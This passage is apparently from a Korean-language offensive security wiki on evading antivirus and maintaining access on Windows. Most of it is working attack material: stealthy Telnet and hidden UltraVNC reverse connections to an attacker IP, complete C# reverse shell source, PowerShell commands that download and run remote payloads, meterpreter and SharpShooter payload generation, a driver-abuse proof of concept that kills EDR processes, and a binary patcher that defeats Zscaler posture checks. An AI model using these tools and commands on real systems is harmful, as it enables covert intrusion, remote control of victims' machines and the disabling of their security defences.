2. 피해자에게서 조용히 설치 프로그램을 실행합니다(관리자 권한 필요): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가서 다음을 클릭합니다. 마법사가 권한 부여를 요청할 것입니다; 계속하려면 권한 부여 버튼을 클릭합니다.
4. 주어진 매개변수를 약간 조정하여 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI를 사용하지 않고 핀을 설정할 수 있는 핀 매개변수에 주의하세요).


## Advanced Evasion

회피는 매우 복잡한 주제이며, 때때로 하나의 시스템에서 여러 가지 다른 텔레메트리 소스를 고려해야 하므로 성숙한 환경에서 완전히 탐지되지 않는 것은 사실상 불가능합니다.

당신이 맞서는 모든 환경은 고유한 강점과 약점을 가지고 있습니다.

더 고급 회피 기술에 대한 발판을 마련하기 위해 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 시청하시기를 권장합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

이것은 [@mariuszbit](https://twitter.com/mariuszbit)의 깊이 있는 회피에 대한 또 다른 훌륭한 강연입니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하여 **바이너리의 일부를 제거**하여 **Defender가 악성으로 찾는 부분을 알아내고** 이를 분리할 수 있습니다.\
또 다른 도구로는 [**avred**](https://github.com/dobin/avred)가 있으며, [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 서비스를 제공하고 있습니다.

### **Telnet Server**

Windows 10까지 모든 Windows에는 **Telnet 서버**가 포함되어 있었으며, 이를 설치(관리자 권한 필요)하려면 다음과 같이 하면 됩니다:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **시작**하고 **지금** 실행하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**텔넷 포트 변경** (은폐) 및 방화벽 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin 다운로드를 원하며, 설치 파일이 아닙니다)

**호스트에서**: _**winvnc.exe**_를 실행하고 서버를 구성합니다:

- _Disable TrayIcon_ 옵션을 활성화합니다
- _VNC Password_에 비밀번호를 설정합니다
- _View-Only Password_에 비밀번호를 설정합니다

그런 다음, 이진 파일 _**winvnc.exe**_와 **새로** 생성된 파일 _**UltraVNC.ini**_를 **희생자** 안으로 이동합니다

#### **역방향 연결**

**공격자**는 **호스트** 내에서 이진 파일 `vncviewer.exe -listen 5900`를 **실행**하여 역방향 **VNC 연결**을 받을 준비를 합니다. 그런 다음, **희생자** 내에서: winvnc 데몬 `winvnc.exe -run`을 시작하고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`을 실행합니다

**경고:** 은폐를 유지하기 위해 몇 가지를 하지 않아야 합니다

- `winvnc`가 이미 실행 중이라면 시작하지 마세요. 그렇지 않으면 [팝업](https://i.imgur.com/1SROTTl.png)이 발생합니다. `tasklist | findstr winvnc`로 실행 중인지 확인하세요
- 같은 디렉토리에 `UltraVNC.ini` 없이 `winvnc`를 시작하지 마세요. 그렇지 않으면 [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
- 도움을 위해 `winvnc -h`를 실행하지 마세요. 그렇지 않으면 [팝업](https://i.imgur.com/oc18wcu.png)이 발생합니다

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 **lister**를 `msfconsole -r file.rc`로 **시작**하고 **xml payload**를 다음과 같이 **실행**합니다:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 방어자는 프로세스를 매우 빠르게 종료합니다.**

### 자체 리버스 셸 컴파일하기

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# 리버스 셸

다음과 같이 컴파일합니다:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
사용하세요:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 컴파일러 사용
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 파이썬을 사용한 인젝터 빌드 예제:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603는 **Antivirus Terminator**라는 작은 콘솔 유틸리티를 활용하여 랜섬웨어를 배포하기 전에 엔드포인트 보호 기능을 비활성화했습니다. 이 도구는 **자체적으로 취약하지만 *서명된* 드라이버**를 가져와서 이를 악용하여 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 특권 커널 작업을 수행합니다.

주요 내용
1. **서명된 드라이버**: 디스크에 전달된 파일은 `ServiceMouse.sys`이지만, 이진 파일은 Antiy Labs의 “System In-Depth Analysis Toolkit”에서 온 합법적으로 서명된 드라이버 `AToolsKrnl64.sys`입니다. 이 드라이버는 유효한 Microsoft 서명을 가지고 있어 Driver-Signature-Enforcement (DSE)가 활성화되어 있어도 로드됩니다.
2. **서비스 설치**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **커널 서비스**로 등록하고, 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 사용자 공간에서 접근 가능하게 만듭니다.
3. **드라이버에 의해 노출된 IOCTLs**
| IOCTL 코드 | 기능                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID로 임의의 프로세스를 종료 (Defender/EDR 서비스 종료에 사용) |
| `0x990000D0` | 디스크에서 임의의 파일 삭제 |
| `0x990001D0` | 드라이버 언로드 및 서비스 제거 |

최소 C 증명 개념:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **작동 원리**: BYOVD는 사용자 모드 보호 기능을 완전히 우회합니다. 커널에서 실행되는 코드는 *보호된* 프로세스를 열거나 종료하거나 PPL/PP, ELAM 또는 기타 강화 기능에 관계없이 커널 객체를 조작할 수 있습니다.

탐지 / 완화
• Microsoft의 취약 드라이버 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys`를 로드하지 않도록 합니다.
• 새로운 *커널* 서비스의 생성 모니터링 및 드라이버가 세계 쓰기 가능 디렉토리에서 로드되거나 허용 목록에 없을 때 경고합니다.
• 사용자 모드 핸들이 사용자 정의 장치 객체에 대한 후속 의심스러운 `DeviceIoControl` 호출을 감시합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 자세 규칙을 로컬에서 적용하고 Windows RPC를 통해 결과를 다른 구성 요소에 전달합니다. 두 가지 약한 설계 선택으로 인해 완전한 우회가 가능합니다:

1. 자세 평가가 **완전히 클라이언트 측**에서 발생합니다 (부울 값이 서버로 전송됨).
2. 내부 RPC 엔드포인트는 연결된 실행 파일이 **Zscaler에 의해 서명되었는지**만 검증합니다 (via `WinVerifyTrust`).

**디스크에서 네 개의 서명된 이진 파일을 패치함으로써** 두 가지 메커니즘을 무력화할 수 있습니다:

| 이진 파일 | 패치된 원래 로직 | 결과 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하여 모든 검사가 준수됨 |
| `ZSAService.exe` | `WinVerifyTrust`에 대한 간접 호출 | NOP-ed ⇒ 어떤 (서명되지 않은) 프로세스도 RPC 파이프에 바인딩 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 교체 |
| `ZSATunnel.exe` | 터널에 대한 무결성 검사 | 단축 회로 처리 |

최소 패처 발췌:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 재시작한 후:

* **모든** 포스처 검사가 **녹색/준수**로 표시됩니다.
* 서명되지 않았거나 수정된 바이너리가 명명된 파이프 RPC 엔드포인트(예: `\\RPC Control\\ZSATrayManager_talk_to_me`)를 열 수 있습니다.
* 손상된 호스트는 Zscaler 정책에 의해 정의된 내부 네트워크에 무제한으로 접근할 수 있습니다.

이 사례 연구는 순수한 클라이언트 측 신뢰 결정과 간단한 서명 검사가 몇 개의 바이트 패치로 어떻게 무력화될 수 있는지를 보여줍니다.

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
